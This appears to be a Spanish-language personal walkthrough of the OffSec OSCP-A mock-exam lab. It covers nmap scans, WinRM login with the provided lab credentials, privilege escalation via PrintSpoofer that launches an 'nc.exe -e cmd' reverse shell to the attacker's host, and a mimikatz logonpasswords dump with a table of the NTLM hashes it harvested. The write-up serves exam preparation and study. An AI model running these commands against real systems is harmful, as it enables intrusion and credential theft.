# Challenges: OSCP-A	

## Fecha: 25/07/2025
## Objetivo

This is the first of three dedicated OSCP Challenge Labs. It is composed of six OSCP+ machines. The intention of this Challenge is to 
provide a mock-exam experience that closely reflects a similar level of difficulty to that of the actual OSCP+ exam.

The challenge contains three machines that are connected via Active Directory, 
and another three standalone machines that do not have any dependencies or intranet connections. 
All of the standalone machines have a local.txt and a proof.txt flag, however the Active Directory set 
only has a proof.txt on the Domain Controller. While the Challenge Labs have no point values, 
on the exam the standalone machines would be worth 20 points each for a total of 60 points. 
The Active Directory set is worth 40 points all together.

To align with the OSCP+ 'Assumed Breach' scenario for the Active Directory portion of the exam, 
please use the credentials below for initial access: 

* Username: **Eric.Wallows** 
* Password: **EricLikesRunning800**

All the intended attack vectors for these machines are taught in the PEN-200 Modules, or are leveraged in the PEN-200 Challenge Labs 1-3. 
However, the specific requirements to trigger the vulnerabilities may differ from the exact scenarios and techniques demonstrated in the course material. 
You are expected to be able to take the demonstrated exploitation techniques and modify them for the current environment.

Please feel free to complete this challenge at your own pace. While the OSCP+ exam lasts for 23:45 hours, 
it is designed so that the machines can be successfully attacked in much less time. 
While each student is different, _we highly recommend that you plan to spend a significant amount of time resting, eating, hydrating, and sleeping during your exam._ 
Thus, **we explicitly do not recommend that you attempt to work on this Challenge Lab for 24 hours straight**.

We recommend that you begin with a network scan on all the provided IP addresses, 
and then enumerate each machine based on the results. When you are finished with the Challenge, 
we suggest that you create a mock-exam report for your own records, 
according to the advice provided in the Report Writing for Penetration Testers Module.

Good luck!

## Herramientas
1. tool - 1 
2. tool - 2

## Procedimientos y comandos

* Standalone
```
192.168.212.143 [x] local / proof
192.168.212.144 [x] local / proof
192.168.212.145 [x] local / proof
```
* Active Directory
```    
192.168.212.141 <-- maquina con credenciales 
10.10.172.140 DC01 --> proof.txt [x]
10.10.172.142 Domain
```
* Credenciales:
```
 Username: Eric.Wallows
 Password: EricLikesRunning800
```

#### Mapeo de DMZ

```bash
┌──(root㉿kali)-[/home/kali/OffSec/Challenges/4_OSCP-A]
└─# nmap -sV -sC 192.168.212.141 192.168.212.143 192.168.212.144 192.168.212.145 -Pn -oN dmz-result.txt
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-25 09:27 -03
Nmap scan report for 192.168.212.141
Host is up (0.15s latency).
Not shown: 992 closed tcp ports (reset)
PORT     STATE SERVICE       VERSION
22/tcp   open  ssh           OpenSSH for_Windows_8.1 (protocol 2.0)
| ssh-hostkey: 
|   3072 e0:3a:63:4a:07:83:4d:0b:6f:4e:8a:4d:79:3d:6e:4c (RSA)
|   256 3f:16:ca:33:25:fd:a2:e6:bb:f6:b0:04:32:21:21:0b (ECDSA)
|_  256 fe:b0:7a:14:bf:77:84:9a:b3:26:59:8d:ff:7e:92:84 (ED25519)
80/tcp   open  http          Apache httpd 2.4.51 ((Win64) PHP/7.4.26)
|_http-title: Home
|_http-server-header: Apache/2.4.51 (Win64) PHP/7.4.26
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-generator: Nicepage 4.8.2, nicepage.com
81/tcp   open  http          Apache httpd 2.4.51 ((Win64) PHP/7.4.26)
|_http-title: Attendance and Payroll System
|_http-server-header: Apache/2.4.51 (Win64) PHP/7.4.26
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
3306/tcp open  mysql         MySQL (unauthorized)
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: -24s
| smb2-time: 
|   date: 2025-07-25T12:30:36
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required

Nmap scan report for 192.168.212.143
Host is up (0.15s latency).
Not shown: 990 filtered tcp ports (no-response)
PORT     STATE SERVICE    VERSION
21/tcp   open  ftp        vsftpd 3.0.3
22/tcp   open  ssh        OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 23:4c:6f:ff:b8:52:29:65:3d:d1:4e:38:eb:fe:01:c1 (RSA)
|   256 0d:fd:36:d8:05:69:83:ef:ae:a0:fe:4b:82:03:32:ed (ECDSA)
|_  256 cc:76:17:1e:8e:c5:57:b2:1f:45:28:09:05:5a:eb:39 (ED25519)
80/tcp   open  http       Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
81/tcp   open  http       Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Test Page for the Nginx HTTP Server on Fedora
443/tcp  open  http       Apache httpd 2.4.41
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
3000/tcp open  ppp?
3001/tcp open  nessus?
3003/tcp open  cgms?
3306/tcp open  mysql      MySQL (unauthorized)
5432/tcp open  postgresql PostgreSQL DB 12.9 - 12.13
| ssl-cert: Subject: commonName=aero
| Subject Alternative Name: DNS:aero
| Not valid before: 2021-05-10T22:20:48
|_Not valid after:  2031-05-08T22:20:48
|_ssl-date: TLS randomness does not represent time
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port3003-TCP:V=7.95%I=7%D=7/25%Time=6883787D%P=x86_64-pc-linux-gnu%r(Ge
SF:nericLines,1,"\n")%r(GetRequest,1,"\n")%r(HTTPOptions,1,"\n")%r(RTSPReq
SF:uest,1,"\n")%r(Help,1,"\n")%r(SSLSessionReq,1,"\n")%r(TerminalServerCoo
SF:kie,1,"\n")%r(Kerberos,1,"\n")%r(FourOhFourRequest,1,"\n")%r(LPDString,
SF:1,"\n")%r(LDAPSearchReq,1,"\n")%r(SIPOptions,1,"\n");
Service Info: Host: 127.0.0.2; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Nmap scan report for 192.168.212.144
Host is up (0.16s latency).
Not shown: 997 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.5
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 fb:ea:e1:18:2f:1d:7b:5e:75:96:5a:98:df:3d:17:e4 (ECDSA)
|_  256 66:f4:54:42:1f:25:16:d7:f3:eb:f7:44:9f:5a:1a:0b (ED25519)
80/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))
| http-git: 
|   192.168.212.144:80/.git/
|     Git repository found!
|     Repository description: Unnamed repository; edit this file 'description' to name the...
|     Last commit message: Security Update 
|     Remotes:
|_      https://<token>@github.com/PWK-Challenge-Lab/dev.git
|_http-title: Home
|_http-server-header: Apache/2.4.52 (Ubuntu)
|_http-generator: Nicepage 4.21.12, nicepage.com
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Nmap scan report for 192.168.212.145
Host is up (0.15s latency).
Not shown: 994 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
21/tcp   open  ftp           Microsoft ftpd
| ftp-syst: 
|_  SYST: Windows_NT
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: TIMEOUT
80/tcp   open  http          Microsoft IIS httpd 10.0
|_http-title: Samuel's Personal Site
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=oscp
| Not valid before: 2025-03-25T21:16:36
|_Not valid after:  2025-09-24T21:16:36
| rdp-ntlm-info: 
|   Target_Name: OSCP
|   NetBIOS_Domain_Name: OSCP
|   NetBIOS_Computer_Name: OSCP
|   DNS_Domain_Name: oscp
|   DNS_Computer_Name: oscp
|   Product_Version: 10.0.19041
|_  System_Time: 2025-07-25T12:30:31+00:00
|_ssl-date: 2025-07-25T12:31:10+00:00; -23s from scanner time.
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2025-07-25T12:30:39
|_  start_date: N/A
|_clock-skew: mean: -23s, deviation: 0s, median: -23s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 4 IP addresses (4 hosts up) scanned in 273.55 seconds
```

| IP                  | Puerto | Estado | Servicio      | Versión / Observaciones                                                                                                              |
| ------------------- | ------ | ------ | ------------- | ------------------------------------------------------------------------------------------------------------------------------------ |
| **192.168.212.141** | 22     | open   | ssh           | OpenSSH for\_Windows\_8.1                                                                                                            |
|                     | 80     | open   | http          | Apache 2.4.51 ((Win64) PHP/7.4.26) - Nicepage                                                                                        |
|                     | 81     | open   | http          | Apache 2.4.51 ((Win64) PHP/7.4.26) - Attendance and Payroll System                                                                   |
|                     | 135    | open   | msrpc         | Microsoft Windows RPC                                                                                                                |
|                     | 139    | open   | netbios-ssn   | Microsoft Windows netbios-ssn                                                                                                        |
|                     | 445    | open   | microsoft-ds  | ?                                                                                                                                    |
|                     | 3306   | open   | mysql         | MySQL (unauthorized)                                                                                                                 |
|                     | 5985   | open   | http          | Microsoft HTTPAPI httpd 2.0                                                                                                          |
| **192.168.212.143** | 21     | open   | ftp           | vsftpd 3.0.3                                                                                                                         |
|                     | 22     | open   | ssh           | OpenSSH 8.2p1 Ubuntu                                                                                                                 |
|                     | 80     | open   | http          | Apache 2.4.41 (Ubuntu)                                                                                                               |
|                     | 81     | open   | http          | Apache 2.4.41 (Ubuntu)                                                                                                               |
|                     | 443    | open   | https         | Apache 2.4.41 (Ubuntu)                                                                                                               |
|                     | 3000   | open   | ?             | ppp?                                                                                                                                 |
|                     | 3001   | open   | ?             | nessus?                                                                                                                              |
|                     | 3003   | open   | ?             | cgms?                                                                                                                                |
|                     | 3306   | open   | mysql         | MySQL (unauthorized)                                                                                                                 |
|                     | 5432   | open   | postgresql    | PostgreSQL 12.9 - 12.13                                                                                                              |
| **192.168.212.144** | 21     | open   | ftp           | vsftpd 3.0.5                                                                                                                         |
|                     | 22     | open   | ssh           | OpenSSH 8.9p1 Ubuntu                                                                                                                 |
|                     | 80     | open   | http          | Apache 2.4.52 (Ubuntu), .git expuesto ([https://github.com/PWK-Challenge-Lab/dev.git](https://github.com/PWK-Challenge-Lab/dev.git)) |
| **192.168.212.145** | 21     | open   | ftp           | Microsoft ftpd, **anon login permitido**                                                                                             |
|                     | 80     | open   | http          | Microsoft IIS 10.0, "Samuel's Personal Site"                                                                                         |
|                     | 135    | open   | msrpc         | Microsoft Windows RPC                                                                                                                |
|                     | 139    | open   | netbios-ssn   | Microsoft Windows netbios-ssn                                                                                                        |
|                     | 445    | open   | microsoft-ds  | ?                                                                                                                                    |
|                     | 3389   | open   | ms-wbt-server | Microsoft Terminal Services, Cert: CN=oscp, Win10 10.0.19041                                                                         |


## AD-Machines: .141 / 


* Entramos con las credenciales de Eric por winrm a la maquina **.141**

```bash
┌──(root㉿kali)-[/home/…/Challenges/4_OSCP-A/dmz/141]
└─# evil-winrm -i 192.168.212.141 -u 'Eric.Wallows' -p 'EricLikesRunning800' -P 5985
                                        
*Evil-WinRM* PS C:\Users\eric.wallows\Documents> whoami /all
                                                                                                                                                                                                                  
USER INFORMATION                                                                                                                                                                                                  
----------------                                                                                                                                                                                                  
                                                                                                                                                                                                                  
User Name         SID                                                                                                                                                                                             
================= ==============================================                                                                                                                                                  
oscp\eric.wallows S-1-5-21-2610934713-1581164095-2706428072-7605                                                                                                                                                  


GROUP INFORMATION
-----------------

Group Name                           Type             SID          Attributes
==================================== ================ ============ ==================================================
Everyone                             Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users      Alias            S-1-5-32-580 Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                        Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                 Well-known group S-1-5-2      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users     Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization       Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication     Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
Mandatory Label\High Mandatory Level Label            S-1-16-12288


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State
============================= ========================================= =======
SeShutdownPrivilege           Shut down the system                      Enabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled
SeUndockPrivilege             Remove computer from docking station      Enabled
SeImpersonatePrivilege        Impersonate a client after authentication Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set            Enabled
SeTimeZonePrivilege           Change the time zone                      Enabled


USER CLAIMS INFORMATION
-----------------------

User claims unknown.

Kerberos support for Dynamic Access Control on this device has been disabled.
```

> Vemos **SeImpersonatePrivilege** enable, revisamos el servicio **spooler**

```powershell
*Evil-WinRM* PS C:\Users\eric.wallows\Documents> Get-Service -Name spooler
                                                                                                                                                                                                                  
Status   Name               DisplayName                                                                                                                                                                           
------   ----               -----------                                                                                                                                                                           
Running  spooler            Print Spooler 
```
Podemos escalar privilegios con PrintSpoofer:

> Descargamos desde nuestro kali en la maquina victima PrintSpoofer64.exe y nc.exe y ejecutamos con un receptor nc activo.

* Ejecucion:

```powershell
*Evil-WinRM* PS C:\Users\eric.wallows\Documents> .\PrintSpoofer.exe -c "C:\Users\eric.wallows\Documents\nc.exe 192.168.45.186 4444 -e cmd"
[+] Found privilege: SeImpersonatePrivilege
[+] Named pipe listening...
[+] CreateProcessAsUser() OK
```

* Receptor:

```bash
                                                                                                                                                                                                                  
┌──(root㉿kali)-[/home/…/Challenges/4_OSCP-A/dmz/141]
└─# nc -lvnp 4444                           
listening on [any] 4444 ...
connect to [192.168.45.186] from (UNKNOWN) [192.168.212.141] 63053
Microsoft Windows [Version 10.0.19044.2251]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32>
```

* Subimos y ejecutamos mimikatz:

```bash
mimikatz # sekurlsa::logonpasswords                                                                                                                                                                               
                                                                                                                                                                                                                  
Authentication Id : 0 ; 416925 (00000000:00065c9d)                                                                                                                                                                
Session           : Interactive from 1                                                                                                                                                                            
User Name         : celia.almeda
Domain            : OSCP
Logon Server      : DC01
Logon Time        : 2/12/2025 2:30:33 PM
SID               : S-1-5-21-2610934713-1581164095-2706428072-1105
        msv :
         [00000003] Primary
         * Username : celia.almeda
         * Domain   : OSCP
         * NTLM     : e728ecbadfb02f51ce8eed753f3ff3fd
         * SHA1     : 8cb61017910862af238631bf7aaae38df64998cd
         * DPAPI    : f3ad0317c20e905dd62889dd51e7c52f
        tspkg :
        wdigest :
         * Username : celia.almeda
         * Domain   : OSCP
         * Password : (null)
        kerberos :
         * Username : celia.almeda
         * Domain   : OSCP.EXAM
         * Password : (null)
        ssp :
        credman :
        cloudap :

Authentication Id : 0 ; 123814 (00000000:0001e3a6)
Session           : Service from 0
User Name         : Mary.Williams
Domain            : MS01
Logon Server      : MS01
Logon Time        : 2/12/2025 2:30:09 PM
SID               : S-1-5-21-2114389728-3978811169-1968162427-1002
        msv :
         [00000003] Primary
         * Username : Mary.Williams
         * Domain   : MS01
         * NTLM     : 9a3121977ee93af56ebd0ef4f527a35e
         * SHA1     : 4b1beca6645e6c3edb991248bcd992ec2a90fbb5
        tspkg :
        wdigest :
         * Username : Mary.Williams
         * Domain   : MS01
         * Password : (null)
        kerberos :
         * Username : Mary.Williams
         * Domain   : MS01
         * Password : (null)
        ssp :
        credman :
        cloudap :

Authentication Id : 0 ; 122914 (00000000:0001e022)
Session           : Service from 0
User Name         : Mary.Williams
Domain            : MS01
Logon Server      : MS01
Logon Time        : 2/12/2025 2:30:09 PM
SID               : S-1-5-21-2114389728-3978811169-1968162427-1002
        msv :
         [00000003] Primary
         * Username : Mary.Williams
         * Domain   : MS01
         * NTLM     : 9a3121977ee93af56ebd0ef4f527a35e
         * SHA1     : 4b1beca6645e6c3edb991248bcd992ec2a90fbb5
        tspkg :
        wdigest :
         * Username : Mary.Williams
         * Domain   : MS01
         * Password : (null)
        kerberos :
         * Username : Mary.Williams
         * Domain   : MS01
         * Password : (null)
        ssp :
        credman :
        cloudap :

Authentication Id : 0 ; 122710 (00000000:0001df56)
Session           : Service from 0
User Name         : Mary.Williams
Domain            : MS01
Logon Server      : MS01
Logon Time        : 2/12/2025 2:30:09 PM
SID               : S-1-5-21-2114389728-3978811169-1968162427-1002
        msv :
         [00000003] Primary
         * Username : Mary.Williams
         * Domain   : MS01
         * NTLM     : 9a3121977ee93af56ebd0ef4f527a35e
         * SHA1     : 4b1beca6645e6c3edb991248bcd992ec2a90fbb5
        tspkg :
        wdigest :
         * Username : Mary.Williams
         * Domain   : MS01
         * Password : (null)
        kerberos :
         * Username : Mary.Williams
         * Domain   : MS01
         * Password : (null)
        ssp :
        credman :
        cloudap :

Authentication Id : 0 ; 84452 (00000000:000149e4)
Session           : Interactive from 1
User Name         : DWM-1
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 2/12/2025 2:30:08 PM
SID               : S-1-5-90-0-1
        msv :
         [00000003] Primary
         * Username : MS01$
         * Domain   : OSCP
         * NTLM     : 0d94b937ef3562f185262da2d6494e65
         * SHA1     : 6782e7eea6300acc3ee78b8482ed39ce3834ae05
        tspkg :
        wdigest :
         * Username : MS01$
         * Domain   : OSCP
         * Password : (null)
        kerberos :
         * Username : MS01$
         * Domain   : oscp.exam
         * Password : 8b 01 33 23 1b f7 2a 1a 2d 04 c7 f3 6c 19 9a 18 75 aa 83 20 c5 ca 3a 47 93 e9 f6 df 9b 69 9f f0 78 5d ab 0a c0 c3 a6 27 e4 8f 5d 53 5e ef 0d 96 53 58 22 52 12 5c 43 f3 a7 c3 e3 86 3f b7 1d de 06 2e 29 e2 08 f8 d0 c2 f4 a7 bc 27 50 eb d1 58 68 b2 80 8c 45 55 fe 15 78 66 13 73 92 73 9e cb 18 2e c2 4d a3 2c 2e ef 2c 14 05 4f e4 a6 5b 0b a2 58 78 0e a0 6b a1 6c b9 89 af 6e 88 15 c5 a6 23 76 a4 08 4e 01 47 3d 1a f1 d0 89 89 b9 4e 8f b1 91 2a f9 8c e1 de d4 45 2e 92 9a d5 71 bc d1 e4 2b 51 34 bc bc cf 7f 71 1e 29 5a 79 af 48 9c a7 d6 40 26 f5 67 cf f4 56 02 32 88 47 76 4d a1 b3 62 c7 71 45 36 71 44 68 3a c2 09 7a f6 3e a7 d2 df 15 8f 24 fe b0 d0 f1 f0 d3 47 d5 36 ef 3d b8 d1 94 3e 09 e9 e2 1e 1a 48 aa c6 c4 30 52 2b 
        ssp :
        credman :
        cloudap :

Authentication Id : 0 ; 84433 (00000000:000149d1)
Session           : Interactive from 1
User Name         : DWM-1
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 2/12/2025 2:30:08 PM
SID               : S-1-5-90-0-1
        msv :
         [00000003] Primary
         * Username : MS01$
         * Domain   : OSCP
         * NTLM     : a913a6db3451444d9dfe26db3f8a8df4
         * SHA1     : 4438b324479e351bcc5c8e645edee0b0a6534637
        tspkg :
        wdigest :
         * Username : MS01$
         * Domain   : OSCP
         * Password : (null)
        kerberos :
         * Username : MS01$
         * Domain   : oscp.exam
         * Password : ec 3f f3 28 b2 fe 85 c4 b0 4b 82 8b 38 c1 1d 2a b4 2a 57 eb bc 55 c9 a6 fd 89 af 26 46 c2 69 23 3d ec 16 b0 58 39 e7 09 fd 0f 2d a1 93 1c 4d af 23 e7 1d 95 e2 0c 33 04 f7 e8 ed 48 9f b1 83 b3 fb 12 b1 7f 61 a3 de 8d 44 1b 39 80 78 50 f0 96 98 ac 52 86 3b 03 bb 61 fc 00 94 09 89 75 db c7 34 0c b9 b0 e2 f2 5d 0c 0b 72 52 36 50 6e 91 1d 70 db 56 0e 75 b5 8c 3f 8a 81 56 83 d3 a6 a0 04 88 d0 cd fd 1f 7b 7c c0 32 3f 54 37 b8 d0 2b 98 d1 6e 81 01 3c f5 d9 b9 ad 0f e7 81 fa 03 03 b0 86 3d b2 5f 1d 44 4e 14 b2 08 30 b8 4a af e2 45 87 10 a1 39 6c cf 34 93 9a 3f 0c c2 02 87 0b 08 2d c0 cd d0 d2 ae 23 df 74 f5 c6 4c 6a 9e 35 9c 8c a0 97 d8 0d ef 71 90 e4 b3 08 eb 1b 58 10 9f 36 f2 49 2b bb 36 b4 8d 32 80 b7 9f f8 47 0a 9d 
        ssp :
        credman :
        cloudap :

Authentication Id : 0 ; 997 (00000000:000003e5)
Session           : Service from 0
User Name         : LOCAL SERVICE
Domain            : NT AUTHORITY
Logon Server      : (null)
Logon Time        : 2/12/2025 2:30:08 PM
SID               : S-1-5-19
        msv :
        tspkg :
        wdigest :
         * Username : (null)
         * Domain   : (null)
         * Password : (null)
        kerberos :
         * Username : (null)
         * Domain   : (null)
         * Password : (null)
        ssp :
        credman :
        cloudap :

Authentication Id : 0 ; 996 (00000000:000003e4)
Session           : Service from 0
User Name         : MS01$
Domain            : OSCP
Logon Server      : (null)
Logon Time        : 2/12/2025 2:30:08 PM
SID               : S-1-5-20
        msv :
         [00000003] Primary
         * Username : MS01$
         * Domain   : OSCP
         * NTLM     : a913a6db3451444d9dfe26db3f8a8df4
         * SHA1     : 4438b324479e351bcc5c8e645edee0b0a6534637
        tspkg :
        wdigest :
         * Username : MS01$
         * Domain   : OSCP
         * Password : (null)
        kerberos :
         * Username : ms01$
         * Domain   : OSCP.EXAM
         * Password : ec 3f f3 28 b2 fe 85 c4 b0 4b 82 8b 38 c1 1d 2a b4 2a 57 eb bc 55 c9 a6 fd 89 af 26 46 c2 69 23 3d ec 16 b0 58 39 e7 09 fd 0f 2d a1 93 1c 4d af 23 e7 1d 95 e2 0c 33 04 f7 e8 ed 48 9f b1 83 b3 fb 12 b1 7f 61 a3 de 8d 44 1b 39 80 78 50 f0 96 98 ac 52 86 3b 03 bb 61 fc 00 94 09 89 75 db c7 34 0c b9 b0 e2 f2 5d 0c 0b 72 52 36 50 6e 91 1d 70 db 56 0e 75 b5 8c 3f 8a 81 56 83 d3 a6 a0 04 88 d0 cd fd 1f 7b 7c c0 32 3f 54 37 b8 d0 2b 98 d1 6e 81 01 3c f5 d9 b9 ad 0f e7 81 fa 03 03 b0 86 3d b2 5f 1d 44 4e 14 b2 08 30 b8 4a af e2 45 87 10 a1 39 6c cf 34 93 9a 3f 0c c2 02 87 0b 08 2d c0 cd d0 d2 ae 23 df 74 f5 c6 4c 6a 9e 35 9c 8c a0 97 d8 0d ef 71 90 e4 b3 08 eb 1b 58 10 9f 36 f2 49 2b bb 36 b4 8d 32 80 b7 9f f8 47 0a 9d 
        ssp :
        credman :
        cloudap :

Authentication Id : 0 ; 48204 (00000000:0000bc4c)
Session           : Interactive from 1
User Name         : UMFD-1
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 2/12/2025 2:30:08 PM
SID               : S-1-5-96-0-1
        msv :
         [00000003] Primary
         * Username : MS01$
         * Domain   : OSCP
         * NTLM     : a913a6db3451444d9dfe26db3f8a8df4
         * SHA1     : 4438b324479e351bcc5c8e645edee0b0a6534637
        tspkg :
        wdigest :
         * Username : MS01$
         * Domain   : OSCP
         * Password : (null)
        kerberos :
         * Username : MS01$
         * Domain   : oscp.exam
         * Password : ec 3f f3 28 b2 fe 85 c4 b0 4b 82 8b 38 c1 1d 2a b4 2a 57 eb bc 55 c9 a6 fd 89 af 26 46 c2 69 23 3d ec 16 b0 58 39 e7 09 fd 0f 2d a1 93 1c 4d af 23 e7 1d 95 e2 0c 33 04 f7 e8 ed 48 9f b1 83 b3 fb 12 b1 7f 61 a3 de 8d 44 1b 39 80 78 50 f0 96 98 ac 52 86 3b 03 bb 61 fc 00 94 09 89 75 db c7 34 0c b9 b0 e2 f2 5d 0c 0b 72 52 36 50 6e 91 1d 70 db 56 0e 75 b5 8c 3f 8a 81 56 83 d3 a6 a0 04 88 d0 cd fd 1f 7b 7c c0 32 3f 54 37 b8 d0 2b 98 d1 6e 81 01 3c f5 d9 b9 ad 0f e7 81 fa 03 03 b0 86 3d b2 5f 1d 44 4e 14 b2 08 30 b8 4a af e2 45 87 10 a1 39 6c cf 34 93 9a 3f 0c c2 02 87 0b 08 2d c0 cd d0 d2 ae 23 df 74 f5 c6 4c 6a 9e 35 9c 8c a0 97 d8 0d ef 71 90 e4 b3 08 eb 1b 58 10 9f 36 f2 49 2b bb 36 b4 8d 32 80 b7 9f f8 47 0a 9d 
        ssp :
        credman :
        cloudap :

Authentication Id : 0 ; 48153 (00000000:0000bc19)
Session           : Interactive from 0
User Name         : UMFD-0
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 2/12/2025 2:30:08 PM
SID               : S-1-5-96-0-0
        msv :
         [00000003] Primary
         * Username : MS01$
         * Domain   : OSCP
         * NTLM     : a913a6db3451444d9dfe26db3f8a8df4
         * SHA1     : 4438b324479e351bcc5c8e645edee0b0a6534637
        tspkg :
        wdigest :
         * Username : MS01$
         * Domain   : OSCP
         * Password : (null)
        kerberos :
         * Username : MS01$
         * Domain   : oscp.exam
         * Password : ec 3f f3 28 b2 fe 85 c4 b0 4b 82 8b 38 c1 1d 2a b4 2a 57 eb bc 55 c9 a6 fd 89 af 26 46 c2 69 23 3d ec 16 b0 58 39 e7 09 fd 0f 2d a1 93 1c 4d af 23 e7 1d 95 e2 0c 33 04 f7 e8 ed 48 9f b1 83 b3 fb 12 b1 7f 61 a3 de 8d 44 1b 39 80 78 50 f0 96 98 ac 52 86 3b 03 bb 61 fc 00 94 09 89 75 db c7 34 0c b9 b0 e2 f2 5d 0c 0b 72 52 36 50 6e 91 1d 70 db 56 0e 75 b5 8c 3f 8a 81 56 83 d3 a6 a0 04 88 d0 cd fd 1f 7b 7c c0 32 3f 54 37 b8 d0 2b 98 d1 6e 81 01 3c f5 d9 b9 ad 0f e7 81 fa 03 03 b0 86 3d b2 5f 1d 44 4e 14 b2 08 30 b8 4a af e2 45 87 10 a1 39 6c cf 34 93 9a 3f 0c c2 02 87 0b 08 2d c0 cd d0 d2 ae 23 df 74 f5 c6 4c 6a 9e 35 9c 8c a0 97 d8 0d ef 71 90 e4 b3 08 eb 1b 58 10 9f 36 f2 49 2b bb 36 b4 8d 32 80 b7 9f f8 47 0a 9d 
        ssp :
        credman :
        cloudap :

Authentication Id : 0 ; 46093 (00000000:0000b40d)
Session           : UndefinedLogonType from 0
User Name         : (null)
Domain            : (null)
Logon Server      : (null)
Logon Time        : 2/12/2025 2:30:08 PM
SID               : 
        msv :
         [00000003] Primary
         * Username : MS01$
         * Domain   : OSCP
         * NTLM     : a913a6db3451444d9dfe26db3f8a8df4
         * SHA1     : 4438b324479e351bcc5c8e645edee0b0a6534637
        tspkg :
        wdigest :
        kerberos :
        ssp :
        credman :
        cloudap :

Authentication Id : 0 ; 999 (00000000:000003e7)
Session           : UndefinedLogonType from 0
User Name         : MS01$
Domain            : OSCP
Logon Server      : (null)
Logon Time        : 2/12/2025 2:30:08 PM
SID               : S-1-5-18
        msv :
        tspkg :
        wdigest :
         * Username : MS01$
         * Domain   : OSCP
         * Password : (null)
        kerberos :
         * Username : ms01$
         * Domain   : OSCP.EXAM
         * Password : ec 3f f3 28 b2 fe 85 c4 b0 4b 82 8b 38 c1 1d 2a b4 2a 57 eb bc 55 c9 a6 fd 89 af 26 46 c2 69 23 3d ec 16 b0 58 39 e7 09 fd 0f 2d a1 93 1c 4d af 23 e7 1d 95 e2 0c 33 04 f7 e8 ed 48 9f b1 83 b3 fb 12 b1 7f 61 a3 de 8d 44 1b 39 80 78 50 f0 96 98 ac 52 86 3b 03 bb 61 fc 00 94 09 89 75 db c7 34 0c b9 b0 e2 f2 5d 0c 0b 72 52 36 50 6e 91 1d 70 db 56 0e 75 b5 8c 3f 8a 81 56 83 d3 a6 a0 04 88 d0 cd fd 1f 7b 7c c0 32 3f 54 37 b8 d0 2b 98 d1 6e 81 01 3c f5 d9 b9 ad 0f e7 81 fa 03 03 b0 86 3d b2 5f 1d 44 4e 14 b2 08 30 b8 4a af e2 45 87 10 a1 39 6c cf 34 93 9a 3f 0c c2 02 87 0b 08 2d c0 cd d0 d2 ae 23 df 74 f5 c6 4c 6a 9e 35 9c 8c a0 97 d8 0d ef 71 90 e4 b3 08 eb 1b 58 10 9f 36 f2 49 2b bb 36 b4 8d 32 80 b7 9f f8 47 0a 9d 
        ssp :
        credman :
        cloudap :

mimikatz #

```
#### Informacion ordenada de sekurlsa::logonpasswords

| **Usuario**                     | **Dominio** | **NTLM**                         | **SID**                                        | **Notas**                         |
| ------------------------------- | ----------- | -------------------------------- | ---------------------------------------------- | --------------------------------- |
| celia.almeda                    | OSCP        | e728ecbadfb02f51ce8eed753f3ff3fd | S-1-5-21-2610934713-1581164095-2706428072-1105 | User con sesión interactiva       |
| Mary.Williams                   | MS01        | 9a3121977ee93af56ebd0ef4f527a35e | S-1-5-21-2114389728-3978811169-1968162427-1002 | Repetido en múltiples sesiones    |
| MS01\$                          | OSCP        | 0d94b937ef3562f185262da2d6494e65 | S-1-5-90-0-1                                   | Cuenta máquina, usado en kerberos |
